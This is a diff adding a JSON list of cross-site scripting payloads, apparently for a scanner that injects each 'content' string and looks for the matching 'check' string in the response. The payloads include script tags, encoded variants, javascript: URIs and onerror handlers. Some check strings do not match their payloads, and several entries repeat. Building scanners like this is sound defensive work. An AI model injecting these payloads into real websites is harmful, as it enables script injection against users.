@@ -1,0 +1,22 @@
+[
+    { "content": "<script>alert('{{message}}');</script>", "check": "<script>alert('{{message}}');</script>" },
+    { "content": "&lt;script&gt;alert('{{message}}');&lt;/script&gt;", "check": "<script>alert('{{message}}');</script>" },
+    { "content": "</td><script>alert('{{message}}');</script><td>", "check": "<script>alert('{{message}}');</script>" },
+    { "content": "&lt;/td&gt;&lt;script&gt;alert('{{message}}');&lt;/script&gt;&lt;td&gt;", "check": "<script>alert('{{message}}');</script>" },
+    { "content": "<script>alert({{message}});</script>", "check": "<script>alert({{message}});</script>" },
+    { "content": "<ScRipT>alert(\"{{message}}\");</ScRipT>", "check": "<script>alert(\"{{message}}\");</script>" },
+    { "content": "<script>alert({{message}})</script>", "check": "<script>alert({{message}});</script>" },
+    { "content": "<script>alert(\"{{message}}\");</script>", "check": "<script>alert(\"{{message}}\");</script>" },
+    { "content": "<script>alert({{message}})</script>", "check": "<script>alert({{message}});</script>" },
+    { "content": "<script>alert(“{{message}}”);</script>", "check": "<script>alert(“{{message}}”);</script>" },
+    { "content": "<script>alert(‘{{message}}’)</script>", "check": "<script>alert(‘{{message}}’);</script>" },
+    { "content": "“><script>alert(“{{message}}”)</script>", "check": "<script>alert(“{{message}}”);</script>" },
+    { "content": "<script>alert(/{{message}}/)</script>", "check": "<script>alert(/{{message}}/);</script>" },
+    { "content": "</script><script>alert({{message}})</script>", "check": "<script>alert({{message}});</script>" },
+    { "content": "<ScRiPt>alert({{message}})</sCriPt>", "check": "<script>alert'{{message}}';</script>" },
+    { "content": "<IMG SRC=jAVasCrIPt:alert(‘{{message}}’)>", "check": "<IMG SRC=jAVasCrIPt:alert(‘{{message}}’)>" },
+    { "content": "<IMG SRC=”javascript:alert(‘{{message}}’);”>", "check": "<IMG SRC=”javascript:alert(‘{{message}}’);”>" },
+    { "content": "<IMG SRC=javascript:alert(&quot;{{message}}&quot;)>", "check": "<IMG SRC=javascript:alert(&quot;{{message}}&quot;)>" },
+    { "content": "<img src=xss onerror=alert({{message}})>", "check": "<img src=xss onerror=alert({{message}})>" },
+    { "content": "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('{{message}}');\">", "check": "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('{{message}}');\">" }
+]
